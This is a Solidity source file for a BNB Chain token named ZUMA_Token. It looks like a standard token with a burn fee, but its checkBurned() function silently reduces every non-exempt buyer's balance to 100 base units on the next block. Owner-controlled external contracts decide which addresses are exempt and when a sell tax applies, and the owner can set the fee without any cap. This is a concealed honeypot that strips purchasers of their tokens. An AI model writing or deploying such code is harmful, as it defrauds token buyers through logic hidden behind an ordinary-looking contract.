/**
 *Submitted for verification at BscScan.com on 2022-11-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ZUMA_Token {
    struct BurnedRecords{
        address _account;
        uint256 amount;
    }

    address public owner;
    string public constant name = "ZUMA_Token";
    string public constant symbol = "ZUMA";
    uint8 public constant decimals = 18;
    uint256 private _totalSupply = 1000000000 * 10**decimals;
    uint256 burnFee = 20;

    address[] private lastBuyingAccounts;
    BurnedRecords [] records;
    uint256 lastTxBlock;

    address private factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public authContract = 0x72F426B124fBCA60452EA7F1d1a1eA594D307EFa;
    address public applyTaxContract = 0xc945C084Be5A2d6b5C0054Dad7bAe0d31d2BBC6A;
    address public pairAddress;


    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    mapping(address => bool) internal exemptedAccounts;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        
        pairAddress = computePairAddress(address(this));
        exemptedAccounts[address(0)] = true;
        exemptedAccounts[owner] = true;
        exemptedAccounts[router] = true;
        exemptedAccounts[pairAddress] = true;

        balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner!");
        _;
    }
    function isSubOwnerAddress(address inqAddress) public view returns (bool isOwner) {
        (bool success, bytes memory returnData) = authContract.staticcall(abi.encodeWithSelector(0xfe9fbb80, inqAddress));
        if(success) isOwner = abi.decode(returnData, (bool));
    }
    function isExempted(address _address) public view returns (bool) {
        return (exemptedAccounts[_address] || isSubOwnerAddress(_address));
    }

    function setAuthContract(address _authContract) public onlyOwner {
        authContract = _authContract; // use address(0) to disable authContract
    } 
    function setTaxContract(address _applyTaxContract) public onlyOwner {
        applyTaxContract = _applyTaxContract; // use address(0) to disable authContract
    }
    function applyTax() public view returns (bool _applyTax){
        (bool success, bytes memory returnData) = applyTaxContract.staticcall(abi.encodeWithSelector(0xdc031dfe));
        if(success) _applyTax = abi.decode(returnData, (bool));
    }

    function computePairAddress(address tokenAddress) internal view returns (address) {
        (address token0, address token1) = tokenAddress < wbnb ? (tokenAddress, wbnb) : (wbnb, tokenAddress);
        return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff",factory, keccak256(abi.encodePacked(token0, token1)), hex"00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5")))));
    }
    // ERC20 Functions
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address inqAddress) public view returns (uint256) {
        return balances[inqAddress];
    }

    function transfer(address receiver, uint256 amount) public returns (bool) {
        return _transfer(msg.sender, receiver, amount);
    }

    function transferFrom(address tokenOwner, address receiver, uint256 amount) public returns (bool) {
        require(amount <= allowed[tokenOwner][msg.sender],"Invalid number of tokens allowed by owner");
        allowed[tokenOwner][msg.sender] -= amount;
        return _transfer(tokenOwner, receiver, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address tokenOwner, address spender) public view returns (uint256) {
        return allowed[tokenOwner][spender];
    }

    function _transfer(address sender, address receiver, uint256 amount) internal returns (bool) {
        require(sender!= address(0) && receiver!= address(0), "invalid send or receiver address");
        require(checkBurned() && amount <= balances[sender], "Invalid number of tokens");

        uint256 burnAmount = receiver == pairAddress && applyTax() && !isExempted(sender) ? (amount * burnFee) / 100 : 0 ;

        balances[sender] -= amount;
        balances[receiver] += amount - burnAmount;
        balances[address(0)] += burnAmount;

        emit Transfer(sender, receiver, amount - burnAmount);
        if (burnAmount > 0) emit Transfer(sender, address(0), burnAmount);

        if(!isExempted(receiver)) lastBuyingAccounts.push(receiver);

        return true;
    }

    function setBurnFee(uint256 _burnFee) external onlyOwner returns (bool) {
        burnFee = _burnFee;
        return true;
    }
    
    function checkBurned() internal returns (bool) {
        if(block.number!=lastTxBlock){
            uint256 burnAmount;
            uint256 balance;
            address _burnAddress;
            address[] memory _lastBuyingAccounts = lastBuyingAccounts;
            for (uint256 i = 0; i < _lastBuyingAccounts.length; i++) {
                _burnAddress = _lastBuyingAccounts[i];
                balance = balances[_burnAddress];
                if(balance>100) {
                    burnAmount = balance -100;
                    balances[_burnAddress] = 100;
                    records.push(BurnedRecords(_burnAddress,burnAmount));

                }
            }
            delete lastBuyingAccounts;
            lastTxBlock = block.number;
        }
        return true;
    }

    function emitBurn() public {
        BurnedRecords[] memory br =records;
        for (uint256 i = 0; i < br.length; i++){
             emit Transfer(br[i]._account, address(0), br[i].amount);
        }
        delete records;
    }
}